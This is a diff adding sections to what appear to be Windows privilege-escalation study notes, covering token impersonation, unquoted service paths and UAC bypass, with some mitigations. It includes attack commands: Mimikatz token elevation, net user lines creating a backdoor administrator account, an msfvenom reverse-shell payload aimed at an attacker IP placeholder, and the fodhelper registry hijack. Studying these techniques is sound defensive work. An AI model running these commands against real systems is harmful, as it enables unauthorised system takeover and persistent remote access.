@@ -363,6 +363,388 @@ To determine which services are running with elevated privileges, examine their 
   * Tools like **Mimikatz** use DLL injection to extract credentials.
   * Malware injecting keylogging functionality into browsers.
 
+### Abusing Tokens
+
+#### **a. What is Token Impersonation, How It Functions, and Its Importance in Windows Systems**
+
+**Token Impersonation:**
+
+Token impersonation is a technique in which a process or thread "impersonates" another user’s security token to perform actions as that user. In Windows, security tokens are critical to identity and access management, as they store information about a user’s privileges and group memberships.
+
+**How It Functions:**
+
+1. **Security Tokens**:
+   * When a user logs in, Windows creates a **security token** for the session. This token contains the user's identity, groups, and privileges.
+2. **Impersonation**:
+   * A thread can use a **primary token** (representing the owner of a process) or an **impersonation token** to temporarily act on behalf of another user.
+3. **Functionality**:
+   * Applications and services use token impersonation to temporarily act with a different user's privileges for specific tasks, such as accessing network resources.
+
+**Importance in Windows:**
+
+1. **Delegation**: Allows services to act on behalf of users (e.g., file access, resource sharing).
+2. **Access Control**: Determines permissions for files, registry keys, and other objects.
+3. **Privilege Management**: Ensures only authorized actions can be performed.
+
+***
+
+#### **b. How an Attacker Could Use Token Impersonation for Privilege Escalation**
+
+**Attack Process:**
+
+1. **Gaining Initial Access**:
+   * The attacker must first gain access to a system, often as a low-privileged user.
+2. **Identifying Tokens**:
+   * Use tools to locate **impersonation tokens** belonging to higher-privileged accounts, such as **Administrator** or **SYSTEM**.
+3. **Exploiting Tokens**:
+   * If a privileged token is available, the attacker can impersonate it to execute commands or access resources with elevated privileges.
+
+**Potential Tools:**
+
+* **Windows API Functions**:
+  * Tools or scripts may use Windows API calls like:
+    * `OpenProcessToken`
+    * `ImpersonateLoggedOnUser`
+    * `DuplicateToken`
+* **Specific Tools**:
+  1. **Mimikatz**:
+     * Extracts and manipulates tokens.
+     * Command: `privilege::debug` → `token::elevate`
+  2. **Incognito** (part of Metasploit):
+     * Lists available tokens and impersonates them.
+     * Commands: `list_tokens -u`, `impersonate_token`
+  3. **Rubeus**:
+     * Focused on Kerberos, but supports token manipulation.
+  4. **PowerShell Scripts**:
+     * Tools like **PowerSploit** include functions for token impersonation.
+     * Example: `Invoke-TokenManipulation`
+
+***
+
+#### **c. Identifying Target Accounts or System Entities for Token Impersonation**
+
+**Identifying Target Accounts:**
+
+Attackers analyze the system to find high-value tokens, often belonging to privileged accounts. They may:
+
+1. **Enumerate Logged-On Users**:
+   * List all users currently logged in to the system.
+   *   Tools: `quser`, `whoami`, or PowerShell commands like:
+
+       ```powershell
+       Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName
+       ```
+2. **Search for Running Processes**:
+   * Look for processes running under privileged accounts (e.g., `winlogon.exe`, `services.exe`).
+   * Tools: `tasklist`, Sysinternals' **Process Explorer**.
+3. **List Available Tokens**:
+   * Use tools like **Incognito** or **Mimikatz** to enumerate accessible tokens.
+
+**Factors Influencing the Choice of Targets:**
+
+1. **Privilege Level**:
+   * Tokens belonging to **SYSTEM**, **Administrator**, or domain admin accounts are the most valuable.
+2. **Availability**:
+   * Tokens must be available for impersonation (e.g., tokens left by services or logged-in users).
+3. **Privileges**:
+   * Tokens with elevated privileges such as `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` are prime targets.
+4. **Purpose**:
+   * The attacker’s goal (e.g., data exfiltration, lateral movement) determines the choice of account.
+
+***
+
+#### **Example: Privilege Escalation with Token Impersonation**
+
+1. **Scenario**:
+   * A low-privileged attacker gains access to a server where a service account with Administrator privileges is running.
+2. **Attack Steps**:
+   *   Use **Mimikatz** to enumerate available tokens:
+
+       ```plaintext
+       privilege::debug
+       token::list
+       ```
+   * Identify a token belonging to the Administrator account.
+   *   Impersonate the token:
+
+       ```plaintext
+       token::elevate
+       ```
+   *   Execute privileged commands (e.g., creating a new Administrator user):
+
+       ```plaintext
+       net user hacked Pass123 /add
+       net localgroup administrators hacked /add
+       ```
+3. **Combining Techniques**:
+   * Pair token impersonation with **Kerberos ticket attacks** (e.g., Pass-the-Ticket) for lateral movement.
+   * Use **persistence techniques** (e.g., modifying startup programs) to maintain access after privilege escalation.
+
+***
+
+By abusing token impersonation, attackers can not only escalate privileges but also masquerade as legitimate users, making detection and forensic analysis significantly harder.
+
+### Unquoted Paths
+
+#### **a. What Are Unquoted Paths and Why Are They a Security Risk?**
+
+**What Are Unquoted Paths?**
+
+In Windows, services and executables are often configured with file paths to specify where their binaries reside. If a path contains spaces and is not enclosed in double quotes, it is considered an **unquoted path**. For example:
+
+* `"C:\Program Files\My Service\service.exe"` (properly quoted)
+* `C:\Program Files\My Service\service.exe` (unquoted path).
+
+**Why Is This a Security Risk?**
+
+When a path is unquoted, Windows may incorrectly interpret the path due to spaces and attempt to execute files in unintended locations. For example:
+
+* If the service path is `C:\Program Files\My Service\service.exe`, Windows might look for:
+  1. `C:\Program.exe`
+  2. `C:\Program Files\My.exe`
+  3. `C:\Program Files\My Service\service.exe`
+
+If an attacker places a malicious executable named `Program.exe` or `My.exe` in a location searched first, it will be executed instead of the intended service binary.
+
+**Security Risk for Privilege Escalation:**
+
+1. **Service Privileges**: Many services run with elevated privileges (e.g., SYSTEM or Administrator).
+2. **Malicious Binary Execution**: An attacker can exploit unquoted paths to execute their malicious binary with the same privileges as the service.
+3. **Persistence**: Exploiting unquoted paths may allow attackers to maintain elevated access.
+
+***
+
+#### **b. How to Identify Unquoted Paths on a Windows System**
+
+**Manual Inspection:**
+
+1.  **Check Service Configurations**:\
+    Use the `sc qc` command to display service details:
+
+    ```plaintext
+    sc qc "ServiceName"
+    ```
+
+    Look for unquoted paths in the `BINARY_PATH_NAME`.
+2.  **Check Registry Entries**:\
+    Service configurations are stored in the registry under:
+
+    ```plaintext
+    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
+    ```
+
+    Inspect the `ImagePath` value for each service.
+
+**Automated Tools and Techniques:**
+
+1.  **PowerShell Script**:\
+    Use PowerShell to enumerate services with unquoted paths:
+
+    ```powershell
+    Get-WmiObject Win32_Service | Where-Object { $_.PathName -match ' ' -and $_.PathName -notmatch '"' } | Select-Object Name, PathName
+    ```
+2.  **WMIC Command**:\
+    List all services and search for unquoted paths:
+
+    ```plaintext
+    wmic service get name,displayname,pathname,startmode | findstr /i "C:\Program"
+    ```
+3. **Third-Party Tools**:
+   * **WinPEAS**: Automates the process of finding misconfigurations, including unquoted paths.
+   * **AccessChk**: From Sysinternals, can check permissions on directories and services.
+
+***
+
+#### **c. Exploiting Unquoted Paths for Privilege Escalation**
+
+**Exploitation Process:**
+
+1.  **Identify the Vulnerable Service**:\
+    Use tools or techniques mentioned in part (b) to locate a service with an unquoted path, e.g.:
+
+    ```plaintext
+    Path: C:\Program Files\My Service\service.exe
+    ```
+2.  **Determine Service Privileges**:\
+    Check if the service runs as `SYSTEM` or an Administrator account using:
+
+    ```plaintext
+    sc qc "ServiceName"
+    ```
+
+    Look for the `SERVICE_START_NAME` field.
+3. **Create a Malicious Binary**:\
+   Create a malicious executable (e.g., reverse shell, backdoor) using tools like:
+   *   **msfvenom**:
+
+       ```plaintext
+       msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f exe -o Program.exe
+       ```
+   * **PowerShell Empire**, **Metasploit**, or **manual coding**.
+4. **Place the Malicious Binary**:\
+   Place the binary in one of the paths Windows will search first, e.g.:
+   * `C:\Program.exe`
+   * `C:\Program Files\My.exe`
+5.  **Trigger the Service**:\
+    Restart the service to execute the malicious binary:
+
+    ```plaintext
+    net stop "ServiceName" && net start "ServiceName"
+    ```
+6. **Gain Elevated Privileges**:\
+   When the service starts, it executes the malicious binary with the same privileges as the service, granting the attacker SYSTEM or Administrator access.
+
+***
+
+#### **Example Scenario**
+
+**Vulnerable Configuration:**
+
+A service named `VulnerableService` has the following unquoted path:
+
+```plaintext
+C:\Program Files\Vulnerable Service\service.exe
+```
+
+The service runs as `SYSTEM`.
+
+**Steps to Exploit:**
+
+1.  **Identify the Vulnerable Service**:
+
+    ```plaintext
+    sc qc "VulnerableService"
+    ```
+
+    Output:
+
+    ```plaintext
+    BINARY_PATH_NAME : C:\Program Files\Vulnerable Service\service.exe
+    ```
+2. **Prepare the Malicious Binary**:\
+   Create `Program.exe` with a reverse shell payload.
+3. **Place the Binary**:\
+   Copy `Program.exe` to `C:\`.
+4.  **Trigger the Exploit**:\
+    Restart the service:
+
+    ```plaintext
+    net stop "VulnerableService" && net start "VulnerableService"
+    ```
+5. **Impact**:\
+   When the service starts, Windows executes `C:\Program.exe` with SYSTEM privileges, allowing the attacker full control of the system.
+
+***
+
+#### **Mitigation**
+
+1. **Always Quote Paths**:\
+   Ensure all paths in service configurations are enclosed in double quotes.\
+   Example: `"C:\Program Files\My Service\service.exe"`
+2. **Restrict Directory Permissions**:\
+   Ensure unprivileged users cannot write to directories like `C:\`.
+3. **Monitoring and Alerts**:\
+   Use security monitoring tools to detect unquoted paths and unauthorized changes to service configurations.
+
+### User Account Control Bypass (UAC Bypass)
+
+#### **a. What is User Account Control (UAC), How Does It Function, and Its Importance?**
+
+**What is UAC?**
+
+User Account Control (UAC) is a Windows security feature designed to prevent unauthorized changes to a system. It prompts users for permission or administrative credentials when an action requires elevated privileges. This reduces the likelihood of malware or untrusted applications executing with administrative rights without user consent.
+
+**How Does UAC Work?**
+
+1. **Privilege Separation**: When logged in as an administrator, users run applications with standard privileges by default. UAC ensures that elevated privileges are granted only when explicitly authorized.
+2. **Secure Desktop**: UAC prompts are displayed on a secure desktop to prevent malicious applications from spoofing the UAC dialog.
+3. **UAC Prompt Levels**: The UAC settings allow customization of prompt behavior, such as always notifying or never notifying.
+
+**Importance of UAC:**
+
+* **Prevents Unauthorized Changes**: Stops malicious software from altering system settings without user consent.
+* **Protects System Integrity**: Ensures only trusted actions can modify protected resources.
+* **Encourages Least Privilege**: Encourages users to operate with standard privileges, limiting the attack surface.
+
+***
+
+#### **b. Tools and Techniques to Bypass UAC on Windows Systems**
+
+Despite its security benefits, UAC can be bypassed through various techniques that exploit misconfigurations, registry settings, or vulnerabilities in Windows components.
+
+**Common Techniques to Bypass UAC:**
+
+1. **Fileless Attacks**: Use legitimate Windows utilities (e.g., `msiexec.exe`, `fodhelper.exe`) to bypass UAC. These tools are already trusted by the system and do not trigger a UAC prompt.
+   *   Example:
+
+       ```plaintext
+       fodhelper.exe bypasses UAC by exploiting registry key modifications under HKCU\Software\Classes\ms-settings.
+       ```
+2. **DLL Hijacking**: Load a malicious DLL into a trusted application running with elevated privileges.
+3. **Registry Hijacking**: Modify registry keys used by applications or processes with auto-elevation features to point to malicious executables.
+4. **COM Interface Abuse**: Abuse COM objects with auto-elevate properties to execute code with administrative privileges.
+
+**Popular Tools and Frameworks:**
+
+1. **Metasploit Framework**:
+   * Includes modules for UAC bypass.\
+     Example: `exploit/windows/local/bypassuac`
+2. **PowerSploit**:
+   * A PowerShell-based toolkit with scripts for UAC bypass (e.g., `Invoke-BypassUAC`).
+3. **UACME**:
+   * A tool that exploits Windows auto-elevation vulnerabilities for UAC bypass.
+4. **Empire Framework**:
+   * Includes built-in UAC bypass modules, such as `Invoke-BypassUAC`.
+5. **Custom Scripts**:
+   * Scripts leveraging known techniques like the fodhelper.exe or eventvwr.exe methods.
+
+***
+
+#### **c. Potential Impact of Successfully Bypassing UAC on a Compromised System**
+
+Bypassing UAC allows an attacker to elevate privileges on a compromised system, enabling actions that were previously restricted.
+
+**Impact on System Security:**
+
+1. **Privilege Escalation**:
+   * Gain administrative rights, enabling unrestricted access to system resources.
+   * Execute commands and applications that require elevated privileges.
+2. **Persistence**:
+   * Install rootkits, backdoors, or malicious services to maintain long-term control over the system.
+
+**Impact on System Integrity:**
+
+1. **System Configuration Changes**:
+   * Modify security policies, disable antivirus solutions, or alter firewall rules.
+   * Tamper with sensitive files or settings that require administrative permissions.
+2. **Infect Other Processes**:
+   * Inject malicious code into high-privilege processes, spreading the attack.
+
+**Impact on Confidentiality:**
+
+1. **Access Sensitive Data**:
+   * Read or modify files accessible only to administrators.
+   * Access credentials or hashes stored in privileged locations.
+2. **Steal Information**:
+   * Exfiltrate data from protected directories, such as system logs or security databases.
+
+***
+
+#### **Example Scenario: UAC Bypass for Privilege Escalation**
+
+1. **Initial Access**: An attacker gains access to a Windows system with standard user privileges.
+2. **Identify Elevation Opportunity**: The attacker finds that the UAC prompt is set to "default," allowing certain system tools to auto-elevate.
+3. **Execute Bypass**: The attacker uses the `fodhelper.exe` method to bypass UAC:
+   *   Modify the registry key:
+
+       ```powershell
+       New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "C:\Malicious.exe"
+       ```
+   * Trigger the bypass by executing `fodhelper.exe`.
+4. **Achieve Privilege Escalation**: The malicious executable runs with administrative privileges, granting the attacker full control over the system.
+
+By successfully bypassing UAC, the attacker can fully compromise the target system, evade detection, and escalate their attack chain.
+
 ## AD
 
 ### NBT-NS vs DNS
